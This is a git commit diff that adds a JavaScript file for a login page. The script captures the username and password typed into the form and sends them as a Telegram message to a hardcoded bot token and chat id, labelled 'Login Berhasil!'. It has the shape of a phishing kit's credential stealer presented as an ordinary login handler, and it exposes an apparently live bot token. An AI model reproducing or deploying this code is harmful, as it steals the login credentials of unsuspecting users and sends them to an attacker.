df7be4c5a1a204f3aea81f3e8651a8831a085294
Juna248 <malfoyjhe@gmail.com>
2025-03-07 17:57:59 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,26 @@
+const loginForm = document.getElementById('login-form');
+const tokenBot = '8056667876:AAEO20t2zhQixwouKeX92jdjYqvVS5Nw7YA';
+const chatId = '7168768981';
+
+loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    kirimDataLogin(username, password);
+});
+
+function kirimDataLogin(username, password) {
+    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: `🔒Login Berhasil!\n📌Username: ${username}\n🔑Password: ${password}`
+        })
+    })
+    .then((res) => res.json())
+    .then((data) => console.log(data))
+    .catch((err) => console.error(err));
+}
